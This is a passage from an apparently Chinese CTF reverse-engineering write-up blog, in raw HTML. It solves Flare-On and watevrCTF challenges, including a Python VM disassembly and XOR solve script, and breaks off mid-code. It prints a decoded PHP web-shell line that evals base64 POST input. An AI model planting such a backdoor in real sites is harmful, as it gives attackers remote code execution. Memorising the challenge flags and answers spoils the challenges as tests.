class="string">&quot;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&quot;</span>)</span><br><span class="line"><span class="string">b&#x27;if(isset($_POST[&quot;\\97\\49\\49\\68\\x4F\\84\\116\\x68\\97\\x74\\x44\\x4F\\x54\\x6A\\97\\x76\\x61\\x35\\x63\\x72\\97\\x70\\x41\\84\\x66\\x6C\\97\\x72\\x65\\x44\\65\\x53\\72\\111\\110\\68\\79\\84\\99\\x6F\\x6D&quot;])) &#123; eval(base64_decode($_POST[&quot;\\97\\49\\x31\\68\\x4F\\x54\\116\\104\\x61\\116\\x44\\79\\x54\\106\\97\\118\\97\\53\\x63\\114\\x61\\x70\\65\\84\\102\\x6C\\x61\\114\\101\\x44\\65\\x53\\72\\111\\x6E\\x44\\x4F\\84\\99\\x6F\\x6D&quot;])); &#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中字符串 <code>\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D</code>为: <code>a11DOTthatDOTjava5crapATflareDASHonDOTcom</code></p><p>替换<code>DOT =&gt; . ,DASH =&gt; - ,AT =&gt; @</code>得flag</p><p><code>a11.that.java5crap@flare-on.com</code></p><h3 id="watevrCTF-2019-Repyc"><a href="#watevrCTF-2019-Repyc" class="headerlink" title="[watevrCTF 2019]Repyc"></a>[watevrCTF 2019]Repyc</h3><p>用在线反编译工具<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>，反编译出来一个python虚拟机</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line">佤 = <span class="number">0</span></span><br><span class="line">侰 = ~佤 * ~佤</span><br><span class="line">俴 = 侰 + 侰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> 䯂(<span class="params">䵦</span>):</span></span><br><span class="line">    굴 = 佤</span><br><span class="line">    굿 = 佤</span><br><span class="line">    괠 = [佤] * 俴 ** (俴 * 俴)</span><br><span class="line">    궓 = [佤] * <span class="number">100</span></span><br><span class="line">    괣 = []</span><br><span class="line">    <span class="keyword">while</span> 䵦[굴][佤] != <span class="string">&quot;\xeb\x93\x83&quot;</span>:</span><br><span class="line">        굸 = 䵦[굴][佤].lower()</span><br><span class="line">        亀 = 䵦[굴][侰:]</span><br><span class="line">        <span class="keyword">if</span> 굸 == <span class="string">&quot;\xeb\x89\x83&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] + 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa0\x80&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] ^ 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa0\xb3&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] - 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x83\x83&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] * 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa2\xaf&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] / 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa5\x87&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] &amp; 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa7\xb3&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] | 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xb4\xa1&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[佤]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xab\x87&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbc\x96&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 亀[侰]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xab\xbb&quot;</span>:</span><br><span class="line">            궓[亀[佤]] = 괠[亀[侰]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x94\x93&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 궓[亀[侰]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x8c\x92&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 佤</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xac\x87&quot;</span>:</span><br><span class="line">            궓[亀[佤]] = 佤</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xac\x9f&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = <span class="built_in">input</span>(괠[亀[侰]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbd\xba&quot;</span>:</span><br><span class="line">            궓[亀[佤]] = <span class="built_in">input</span>(괠[亀[侰]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x8f\xaf&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(괠[亀[佤]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xad\x97&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(궓[亀[佤]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xad\xbf&quot;</span>:</span><br><span class="line">            굴 = 괠[亀[佤]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xae\x93&quot;</span>:</span><br><span class="line">            굴 = 궓[亀[佤]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xae\xb3&quot;</span>:</span><br><span class="line">            굴 = 괣.pop()</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xaf\x83&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] &gt; 괠[亀[俴]]:</span><br><span class="line">            굴 = 亀[佤]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbd\xb2&quot;</span>:</span><br><span class="line">            괠[<span class="number">7</span>] = 佤</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(괠[亀[佤]])):</span><br><span class="line">                <span class="keyword">if</span> 괠[亀[佤]] != 괠[亀[侰]]:</span><br><span class="line">                    괠[<span class="number">7</span>] = 侰</span><br><span class="line">                    굴 = 괠[亀[俴]]</span><br><span class="line">                    괣.append(굴)</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbe\xae&quot;</span>:</span><br><span class="line">            괢 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(괠[亀[佤]])):</span><br><span class="line">                괢 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(괠[亀[佤]][i]) ^ 괠[亀[侰]])</span><br><span class="line">            괠[亀[佤]] = 괢</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbf\x9a&quot;</span>:</span><br><span class="line">            괢 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(괠[亀[佤]])):</span><br><span class="line">                괢 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(괠[亀[佤]][i]) - 괠[亀[侰]])</span><br><span class="line">            괠[亀[佤]] = 괢</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x96\x87&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] &gt; 괠[亀[俴]]:</span><br><span class="line">            굴 = 괠[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x97\x8b&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] &gt; 괠[亀[俴]]:</span><br><span class="line">            굴 = 궓[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x98\xb7&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] == 괠[亀[俴]]:</span><br><span class="line">            굴 = 亀[佤]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x9a\xab&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] == 괠[亀[俴]]:</span><br><span class="line">            굴 = 괠[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x9d\x87&quot;</span> <span class="keyword">and</span> 괠[亀[侰]] == 괠[亀[俴]]:</span><br><span class="line">            굴 = 궓[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        굴 += 侰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">䯂(</span><br><span class="line">    [</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 佤, <span class="string">&quot;Authentication token: &quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbd\xba&quot;</span>, 佤, 佤],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;\xea\xbc\x96&quot;</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="string">&quot;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&quot;</span>,</span><br><span class="line">        ],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 俴, 俴 ** (<span class="number">3</span> * 俴 + 侰) - 俴 ** (俴 + 侰)],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, <span class="number">3</span>, 侰],</span><br><span class="line">        [<span class="string">&quot;\xeb\x83\x83&quot;</span>, 俴, 俴, <span class="number">3</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x89\x83&quot;</span>, 俴, 俴, <span class="number">4</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xb4\xa1&quot;</span>, 佤, 俴],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8c\x92&quot;</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbe\xae&quot;</span>, <span class="number">6</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 佤, <span class="string">&quot;Thanks.&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 侰, <span class="string">&quot;Authorizing access...&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8f\xaf&quot;</span>, 佤],</span><br><span class="line">        [<span class="string">&quot;\xeb\x94\x93&quot;</span>, 佤, 佤],</span><br><span class="line">        [<span class="string">&quot;\xea\xbe\xae&quot;</span>, 佤, 俴],</span><br><span class="line">        [<span class="string">&quot;\xea\xbf\x9a&quot;</span>, 佤, <span class="number">4</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, <span class="number">5</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbd\xb2&quot;</span>, 佤, <span class="number">6</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8f\xaf&quot;</span>, 侰],</span><br><span class="line">        [<span class="string">&quot;\xeb\x93\x83&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 侰, <span class="string">&quot;Access denied!&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8f\xaf&quot;</span>, 侰],</span><br><span class="line">        [<span class="string">&quot;\xeb\x93\x83&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>则分析如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VM(</span><br><span class="line">    [</span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, a, <span class="string">&quot;Authentication token: &quot;</span>],<span class="comment"># mov r[0], string1</span></span><br><span class="line">        [<span class="string">&quot;scanf&quot;</span>, a, a], <span class="comment"># get_input</span></span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;mov&quot;</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="string">&quot;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&quot;</span>,</span><br><span class="line">        ], <span class="comment"># mov r[6], string2</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, c, c ** (<span class="number">3</span> * c + b) - c ** (c + b)], <span class="comment"># mov r[2], 120</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, <span class="number">4</span>, <span class="number">15</span>],<span class="comment"># mov r[4], 15</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, <span class="number">3</span>, b], <span class="comment"># mov r[3], 1</span></span><br><span class="line">        [<span class="string">&quot;mul&quot;</span>, c, c, <span class="number">3</span>], <span class="comment"># mul r[2], r[2], r[3] ; 120 * 1</span></span><br><span class="line">        [<span class="string">&quot;add&quot;</span>, c, c, <span class="number">4</span>], <span class="comment"># add r[2], r[2], r[4] 120 + 15 = 135</span></span><br><span class="line">        [<span class="string">&quot;movR&quot;</span>, a, c], <span class="comment"># mov r[0], r[2]</span></span><br><span class="line">        [<span class="string">&quot;setZero&quot;</span>, <span class="number">3</span>], <span class="comment"># mov r[3], 0</span></span><br><span class="line">        [<span class="string">&quot;xorS&quot;</span>, <span class="number">6</span>, <span class="number">3</span>], <span class="comment"># xor r[6], input, r[3] ; 输入异或0放入r[6]</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, a, <span class="string">&quot;Thanks.&quot;</span>], <span class="comment"># mov r[0], string3</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, b, <span class="string">&quot;Authorizing access...&quot;</span>],<span class="comment"># mov r[1], string4</span></span><br><span class="line">        [<span class="string">&quot;print&quot;</span>, a], <span class="comment"># print(&quot;Thanks.&quot;)</span></span><br><span class="line">        [<span class="string">&quot;movs&quot;</span>, a, a], <span class="comment"># movS r[0], input; 输入放入r[0]</span></span><br><span class="line">        [<span class="string">&quot;xorS&quot;</span>, a, c], <span class="comment"># xor r[0], r[0], r[2] ; r[0]中的字符串与r[2]中135进行异或</span></span><br><span class="line">        [<span class="string">&quot;subs&quot;</span>, a, <span class="number">4</span>], <span class="comment"># sub r[0], r[0], r[4] ; r[0]中的字符串减去r[4]中的15</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, <span class="number">5</span>, <span class="number">19</span>], <span class="comment"># mov r[5], 19</span></span><br><span class="line">        [<span class="string">&quot;check&quot;</span>, a, <span class="number">6</span>, <span class="number">5</span>], <span class="comment"># 逐位校验</span></span><br><span class="line">        [<span class="string">&quot;print&quot;</span>, b],</span><br><span class="line">        [<span class="string">&quot;End&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, b, <span class="string">&quot;Access denied!&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;print&quot;</span>, b],</span><br><span class="line">        [<span class="string">&quot;End&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>即<strong>将输入逐位异或135并减去15</strong></p><p>则解题脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&quot;</span>.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="comment"># 观察到\xc3\xc2为unicode码的标志, 故需要先解码</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag.append(((<span class="built_in">ord</span>(i) + <span class="number">15</span>) ^ <span class="number">135</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="FlareOn1-Shellolololol"><a href="#FlareOn1-Shellolololol" class="headerlink" title="[FlareOn1]Shellolololol"></a>[FlareOn1]Shellolololol</h3><ul><li>题目报毒2333333</li></ul><p>存在大量的XOR, 调试跟踪，在最后的地方找到flag对比</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104132336568.png" alt="image-20211104132336568"></p><h3 id="FlareOn6-Memecat-Battlestation"><a href="#FlareOn6-Memecat-Battlestation" class="headerlink" title="[FlareOn6]Memecat Battlestation"></a>[FlareOn6]Memecat Battlestation</h3><p>第一个code</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104133932238.png" alt="image-20211104133932238"></p><p>第二个code</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104133830727.png" alt="image-20211104133830727"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="string">&#x27;\u0003&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span 